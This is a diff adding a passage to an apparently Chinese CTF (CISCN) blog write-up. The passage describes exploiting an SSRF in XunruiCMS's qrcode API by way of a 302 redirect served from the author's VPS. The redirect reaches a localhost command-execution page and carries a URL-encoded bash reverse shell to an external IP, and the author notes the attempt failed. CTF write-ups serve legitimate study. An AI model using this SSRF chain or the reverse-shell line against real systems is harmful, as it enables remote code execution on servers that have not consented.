@@ -57,6 +57,27 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>提示2：github找一下源码?</p>
+<p>找到源码</p>
+<p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p>
+<p>信息打点 发现这个cms的漏洞公示<a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B908%E5%88%86.png" alt="image-20240801200813912"></p>
+<p>定位路径xunruicms-master\dayrui\Fcms\Control\Api\Api.php</p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B910%E5%88%86.png" alt="image-20240801201003706"></p>
+<p>ssrf漏洞</p>
+<p>定位这个函数<strong>dr_catcher_data</strong></p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240801201134900"></p>
+<p>试了下输入本地不行</p>
+<p>302跳转</p>
+<p>自己vps上面构建302.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.149.246.169%2F2222%200%3E%261%22&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps:7777/ctf/302.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240801201517830"></p>
+<p>卡了？ 试了几次都这样 </p>
+<p>gg 跑路 复现失败 ┭┮﹏┭┮</p>
 ]]></content>
       <categories>
         <category>ciscn</category>
